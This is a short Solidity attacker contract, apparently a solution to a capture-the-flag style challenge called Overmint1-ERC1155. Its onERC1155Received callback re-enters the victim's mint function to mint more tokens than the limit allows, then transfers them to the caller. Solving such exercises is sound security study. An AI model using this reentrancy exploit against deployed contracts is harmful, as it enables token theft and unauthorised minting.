// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "../Overmint1-ERC1155.sol";
import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";

contract Overmint1_ERC1155_Attacker is ERC1155Holder {
    Overmint1_ERC1155 public victimContract;

    uint recursionCount = 0;
    constructor(address _victimContract) {
        victimContract = Overmint1_ERC1155(_victimContract);
    }

    function attack() external {
        victimContract.mint(0, "");

        for (uint i = 1; i < 6; i++) {
            victimContract.safeTransferFrom(address(this), msg.sender, 0, 1, "");
        }
    }

    function onERC1155Received(address, address, uint256, uint256, bytes memory) public override returns (bytes4) {
        // perform reentrancy attack
        recursionCount++;
        if (recursionCount < 6) {
            victimContract.mint(0, "");
        }
        return this.onERC1155Received.selector;
    }
}
